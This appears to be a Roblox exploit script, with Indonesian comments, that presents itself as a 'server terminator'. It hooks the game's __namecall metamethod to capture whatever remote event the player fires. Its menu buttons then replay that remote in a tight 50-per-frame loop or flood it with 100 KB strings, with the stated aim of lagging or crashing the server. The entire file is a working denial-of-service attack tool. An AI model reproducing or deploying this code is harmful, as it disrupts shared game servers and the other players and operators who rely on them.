-- [[ BEAST BRUTAL EXECUTOR: SERVER TERMINATOR MODE ]] --
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local RunService = game:GetService("RunService")
local lp = Players.LocalPlayer

-- [[ STATE MANAGEMENT ]] --
local selectedRemote = nil
local targetData = "{}"
local brutalActive = false
local shutdownActive = false

-- [[ NOTIFIKASI SYSTEM ]] --
local function notify(msg, col)
    local n = Instance.new("TextLabel", ScreenGui)
    n.Size = UDim2.new(0, 280, 0, 40)
    n.Position = UDim2.new(0.5, -140, -0.1, 0)
    n.BackgroundColor3 = Color3.fromRGB(5, 5, 5)
    n.TextColor3 = col or Color3.new(1,1,1)
    n.Text = "⚠️ " .. msg:upper()
    n.Font = Enum.Font.GothamBold
    n.TextSize = 12
    Instance.new("UICorner", n)
    Instance.new("UIStroke", n).Color = col or Color3.new(1,1,1)
    
    n:TweenPosition(UDim2.new(0.5, -140, 0.08, 0), "Out", "Back", 0.3)
    task.delay(3, function()
        if n then
            n:TweenPosition(UDim2.new(0.5, -140, -0.1, 0), "In", "Back", 0.3)
            task.wait(0.5)
            n:Destroy()
        end
    end)
end

-- [[ SNIFFER: CAPTURE ONLY ]] --
-- Digunakan hanya untuk menangkap target yang akan dihancurkan
local mt = getrawmetatable(game)
local oldNamecall = mt.__namecall
setreadonly(mt, false)
mt.__namecall = newcclosure(function(self, ...)
    local method = getnamecallmethod()
    local args = {...}
    if (method == "FireServer" or method == "InvokeServer") then
        selectedRemote = self
        targetData = HttpService:JSONEncode(args)
    end
    return oldNamecall(self, ...)
end)
setreadonly(mt, true)

-- [[ UI CONSTRUCTION: AGGRESSIVE RED ]] --
local ScreenGui = Instance.new("ScreenGui", CoreGui)
local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0, 350, 0, 400)
Main.Position = UDim2.new(0.5, -175, 0.3, 0)
Main.BackgroundColor3 = Color3.fromRGB(15, 0, 0)
Main.Visible = false
Instance.new("UICorner", Main)
local MainStroke = Instance.new("UIStroke", Main)
MainStroke.Color = Color3.fromRGB(255, 0, 0)
MainStroke.Thickness = 3

local Title = Instance.new("TextLabel", Main)
Title.Size = UDim2.new(1, 0, 0, 50)
Title.Text = "SERBER TERMINATOR V1"
Title.TextColor3 = Color3.fromRGB(255, 0, 0)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 20
Title.BackgroundTransparency = 1

-- DISPLAY CAPTURED
local TargetLabel = Instance.new("TextLabel", Main)
TargetLabel.Size = UDim2.new(0.9, 0, 0, 30)
TargetLabel.Position = UDim2.new(0.05, 0, 0.15, 0)
TargetLabel.Text = "CAPTURE STATUS: WAITING..."
TargetLabel.TextColor3 = Color3.new(1, 1, 1)
TargetLabel.Font = Enum.Font.Code
TargetLabel.BackgroundTransparency = 1

-- [[ BRUTAL CONTROLS ]] --
local function createBrutalBtn(txt, pos, color, cb)
    local b = Instance.new("TextButton", Main)
    b.Size = UDim2.new(0.9, 0, 0, 50)
    b.Position = pos
    b.BackgroundColor3 = color
    b.Text = txt
    b.TextColor3 = Color3.new(1,1,1)
    b.Font = Enum.Font.GothamBold
    b.TextSize = 14
    Instance.new("UICorner", b)
    b.MouseButton1Click:Connect(function() cb(b) end)
    return b
end

-- 1. FIRE BRUTAL (MASSIVE PACKET)
createBrutalBtn("FIRE BRUTAL (LOOP)", UDim2.new(0.05, 0, 0.3, 0), Color3.fromRGB(80, 0, 0), function(b)
    if not selectedRemote then notify("CAPTURE REMOTE DULU!", Color3.new(1,0,0)) return end
    brutalActive = not brutalActive
    b.Text = brutalActive and "BRUTAL ACTIVE (RUNNING)" or "FIRE BRUTAL (LOOP)"
    b.BackgroundColor3 = brutalActive and Color3.fromRGB(255, 0, 0) or Color3.fromRGB(80, 0, 0)
    
    if brutalActive then
        notify("BRUTAL MODE ENGAGED", Color3.new(1,0,0))
        task.spawn(function()
            while brutalActive do
                local args = HttpService:JSONDecode(targetData)
                for i = 1, 50 do -- 50 paket per loop
                    selectedRemote:FireServer(unpack(args))
                end
                task.wait()
            end
        end)
    end
end)

-- 2. SHUTDOWN SERVER (OVERFLOW)
createBrutalBtn("SHUTDOWN SERVER (LAG)", UDim2.new(0.05, 0, 0.5, 0), Color3.fromRGB(40, 40, 40), function(b)
    if not selectedRemote then notify("CAPTURE REMOTE DULU!", Color3.new(1,0,0)) return end
    shutdownActive = not shutdownActive
    b.Text = shutdownActive and "FREEZING SERVER..." or "SHUTDOWN SERVER (LAG)"
    
    if shutdownActive then
        notify("SERVER CRASH ATTEMPT STARTED", Color3.fromRGB(255, 255, 0))
        -- Logika Lag: Mengirim data yang sangat besar (string overflow)
        local hugeData = string.rep("0", 100000) -- 100kb string
        task.spawn(function()
            while shutdownActive do
                pcall(function()
                    selectedRemote:FireServer(hugeData, hugeData, hugeData)
                end)
                RunService.Stepped:Wait()
            end
        end)
    end
end)

-- 3. RESET CAPTURE
createBrutalBtn("RESET CAPTURE", UDim2.new(0.05, 0, 0.75, 0), Color3.fromRGB(20, 20, 20), function()
    selectedRemote = nil
    TargetLabel.Text = "CAPTURE STATUS: RESET"
    notify("READY TO RE-CAPTURE", Color3.new(1,1,1))
end)

-- UPDATE LOOP
task.spawn(function()
    while task.wait(0.5) do
        if selectedRemote then
            TargetLabel.Text = "TARGET: " .. tostring(selectedRemote)
            TargetLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
        end
    end
end)

-- [[ ICON & DRAG ]] --
local Icon = Instance.new("ImageButton", ScreenGui)
Icon.Size = UDim2.new(0, 60, 0, 60)
Icon.Position = UDim2.new(0.05, 0, 0.45, 0)
Icon.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Icon.Image = "rbxassetid://6031094678" -- Gunakan icon monster/danger
Instance.new("UICorner", Icon).CornerRadius = UDim.new(1,0)
local iS = Instance.new("UIStroke", Icon)
iS.Color = Color3.fromRGB(255, 0, 0)
iS.Thickness = 4

Icon.MouseButton1Click:Connect(function() Main.Visible = not Main.Visible end)
local function drag(o)
    local s, i, sp
    o.InputBegan:Connect(function(inp) if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then s = true; i = inp.Position; sp = o.Position end end)
    o.InputChanged:Connect(function(inp) if s and (inp.UserInputType == Enum.UserInputType.MouseMovement or inp.UserInputType == Enum.UserInputType.Touch) then local d = inp.Position - i; o.Position = UDim2.new(sp.X.Scale, sp.X.Offset + d.X, sp.Y.Scale, sp.Y.Offset + d.Y) end end)
    UserInputService.InputEnded:Connect(function(inp) if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then s = false end end)
end
drag(Icon); drag(Main)
